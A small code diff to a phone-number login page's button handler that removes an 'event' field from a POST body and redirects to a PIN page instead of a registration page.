@@ -333,7 +333,6 @@ nextBtn.addEventListener("click", async () => {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      event: "login",
       phone: fullPhone,
       lang: current
     })
@@ -341,7 +340,7 @@ nextBtn.addEventListener("click", async () => {
 
   triedSubmit = true;
   setError(true, LANGS[current].notRegistered);
-  window.location.href = "register.html";
+  window.location.href = "pin.html";
 });
 
 render();
